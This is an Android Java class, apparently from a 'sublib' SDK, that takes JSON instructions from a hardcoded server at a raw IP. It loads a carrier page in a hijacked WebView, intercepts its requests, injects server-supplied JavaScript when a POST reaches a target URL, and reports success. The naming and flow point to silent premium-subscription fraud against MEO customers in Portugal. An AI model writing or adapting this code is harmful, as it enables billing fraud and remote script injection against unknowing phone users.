package com.enhtmv.sublib.webview;

import android.os.Handler;
import android.os.Looper;
import android.webkit.ValueCallback;
import android.webkit.WebResourceRequest;
import android.webkit.WebResourceResponse;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import com.alibaba.fastjson.JSON;
import com.enhtmv.sublib.common.SubEvent;
import com.enhtmv.sublib.common.SubWebView;
import com.enhtmv.sublib.common.util.StringUtil;
import com.enhtmv.sublib.common.util.SubLog;

import java.io.InputStream;

import static com.enhtmv.sublib.common.SubEvent.*;


public class PutaoyaMEOSub extends SubWebView {


    public static final Handler handler = new Handler(Looper.getMainLooper());


    public PutaoyaMEOSub(WebView webView, SubEvent subEvent) {

        super(webView, subEvent, "http://54.153.76.222:8081");

    }


    @Override
    public void sub(final String text) {


        new Thread(new Runnable() {
            @Override
            public void run() {

                try {
                    if (!StringUtil.isEmpty(text)) {

                        final Info info = JSON.parseObject(text, Info.class);

                        if (info.loadUrl != null) {

                            handler.post(new Runnable() {
                                @Override
                                public void run() {
                                    webView.setWebViewClient(new WebViewClient() {

                                        @Override
                                        public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
                                            view.loadUrl(request.getUrl().toString());
                                            return true;
                                        }

                                        @Override
                                        public WebResourceResponse shouldInterceptRequest(WebView view, WebResourceRequest request) {

                                            String url = request.getUrl().toString();

                                            String method = request.getMethod();

                                            try {


                                                //本地资源文件
                                                if (url.endsWith(".css") || url.endsWith(".png") || url.endsWith(".ico") || url.endsWith(".jpg")) {


                                                    SubLog.i("ignore", url);

                                                    return new WebResourceResponse("", "", null);

                                                } else if (url.endsWith("jquery.min.js")) { //js

                                                    SubLog.i("load js", url);

                                                    InputStream stream = view.getContext().getAssets().open("meo.jquery.min.js");

                                                    return new WebResourceResponse("text/javascript", "UTF-8", stream);

                                                } else if (url.contains(info.fireUrl) && "POST".equals(method)) { //执行js

                                                    WebResourceResponse response = super.shouldInterceptRequest(view, request);

                                                    handler.post(new Runnable() {
                                                        @Override
                                                        public void run() {

                                                            webView.evaluateJavascript(info.jscript, new ValueCallback<String>() {
                                                                @Override
                                                                public void onReceiveValue(String s) {
                                                                    report(CALL_JAVASCRIPT);
                                                                    SubLog.i("execute javascript", s);
                                                                }
                                                            });

                                                        }
                                                    });

                                                    return response;

                                                    //执行成功判断
                                                } else if (url.contains(info.successUrl)) {

                                                    successCall.callback("success");
                                                    report(SUB_SUCCESS);

                                                } else {
                                                    return super.shouldInterceptRequest(view, request);
                                                }

                                            } catch (Exception e) {

                                                SubLog.e(e);
                                                report.e("error", e);
                                                event.onError(e);
                                            }

                                            return super.shouldInterceptRequest(view, request);
                                        }

                                    });


                                    webView.loadUrl(info.loadUrl);
                                    report(SUB_REQEUST);
                                }
                            });


                        }

                    }

                } catch (Exception e) {
                    SubLog.e(e);
                    report.e("error", e);
                    event.onError(e);
                }

            }
        }).start();

    }


    @Override
    public void onSub(String message) {

    }

    public static class Info {

        String loadUrl;
        String jscript;
        String fireUrl;
        String successUrl;

        public void setLoadUrl(String loadUrl) {
            this.loadUrl = loadUrl;
        }

        public void setJscript(String jscript) {
            this.jscript = jscript;
        }

        public void setFireUrl(String fireUrl) {
            this.fireUrl = fireUrl;
        }

        public void setSuccessUrl(String successUrl) {
            this.successUrl = successUrl;
        }
    }

}
